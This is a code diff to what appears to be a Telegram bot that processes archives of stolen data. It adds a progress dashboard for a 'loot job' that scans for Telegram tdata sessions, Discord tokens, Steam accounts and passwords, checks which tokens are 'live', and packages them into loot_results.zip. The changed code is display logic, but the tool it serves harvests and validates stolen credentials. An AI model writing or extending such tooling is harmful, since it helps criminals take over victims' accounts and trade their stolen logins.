@@ -137,15 +137,60 @@ def _buckets_from_pick(pick: str) -> frozenset[str]:
     return frozenset({pick})
 
 
+def _loot_bucket_lines(progress: ExtractionProgress) -> str:
+    """Render the per-bucket count / status block shared by every loot
+    phase. ``loot_bucket`` indicates the scanner currently running;
+    ``loot_counts`` holds the per-bucket totals as they're finalised."""
+    counts = getattr(progress, "loot_counts", {}) or {}
+    valid_counts = getattr(progress, "loot_valid_counts", {}) or {}
+    active = getattr(progress, "loot_bucket", "") or ""
+    if not counts and not active:
+        return ""
+    emoji = {
+        "tdata": "\U0001f4f1",
+        "discord": "\U0001f3ae",
+        "steam": "\U0001f3ae",
+        "passwords": "\U0001f511",
+    }
+    out: List[str] = []
+    for name in ("tdata", "discord", "steam", "passwords"):
+        if name not in counts and name != active:
+            continue
+        e = emoji.get(name, "\u2022")
+        if name in counts:
+            extra = ""
+            if name == "discord" and "discord" in valid_counts:
+                extra = f" ({valid_counts['discord']} live)"
+            elif name == "steam" and "steam" in valid_counts:
+                extra = f" ({valid_counts['steam']} live)"
+            out.append(
+                f"   {e} {name:<10s} \u2705 {counts[name]:,}{extra}"
+            )
+        else:
+            out.append(f"   {e} {name:<10s} \u23f3 scanning\u2026")
+    val_total = getattr(progress, "loot_validate_total", 0) or 0
+    val_done = getattr(progress, "loot_validate_done", 0) or 0
+    if val_total:
+        out.append(
+            f"   \U0001f6e1 Validating {val_done}/{val_total}"
+        )
+    return "\n".join(out)
+
+
 def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
-    """Compact dashboard message for the loot worker. We don't try to
-    show as many per-domain stats as ``_progress_updater`` in
-    ``extract.py`` because loot has 4 separate buckets — terse beats
-    pretty here."""
+    """Compact dashboard message for the loot worker.
+
+    Per-bucket counts + an indicator for the currently-running scanner
+    are appended underneath the phase summary so the user can see what
+    the bot is actually doing right now (e.g. ``tdata 2`` /
+    ``discord scanning…``).
+    """
     phase = progress.phase
     cur_file = (progress.current_file or "…")
     if len(cur_file) > 40:
         cur_file = cur_file[:37] + "…"
+    buckets = _loot_bucket_lines(progress)
+    buckets_suffix = f"\n{buckets}" if buckets else ""
 
     if phase == "downloading":
         pct = (
@@ -182,17 +227,37 @@ def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
             f"\u23f1 Elapsed: {seconds_human(elapsed)}"
         )
     if phase == "scanning":
+        active = getattr(progress, "loot_bucket", "") or ""
+        active_line = (
+            f"\U0001f50d Scanning bucket: {active}"
+            if active else
+            "\U0001f50d Scanning for tdata / Discord / Steam / creds"
+        )
         return (
             f"\U0001f4e6 Loot Job\n"
-            f"\U0001f50d Scanning for tdata / Discord / Steam / creds\n"
+            f"{active_line}\n"
             f"   Now: {cur_file}\n"
             f"\u23f1 Elapsed: {seconds_human(elapsed)}"
+            f"{buckets_suffix}"
+        )
+    if phase == "validating":
+        val_total = getattr(progress, "loot_validate_total", 0) or 0
+        val_done = getattr(progress, "loot_validate_done", 0) or 0
+        pct = (val_done / max(val_total, 1)) * 100 if val_total else 0
+        return (
+            f"\U0001f4e6 Loot Job\n"
+            f"\U0001f6e1 Validating tokens / accounts\n"
+            f"   {progress_bar(val_done, val_total)} {pct:.0f}% "
+            f"({val_done:,}/{val_total:,})\n"
+            f"\u23f1 Elapsed: {seconds_human(elapsed)}"
+            f"{buckets_suffix}"
         )
     if phase == "packaging":
         return (
             f"\U0001f4e6 Loot Job\n"
             f"\U0001f4be Packaging loot_results.zip…\n"
             f"\u23f1 Elapsed: {seconds_human(elapsed)}"
+            f"{buckets_suffix}"
         )
     if phase == "done":
         return "\u2705 Loot scan finished — sending file…"
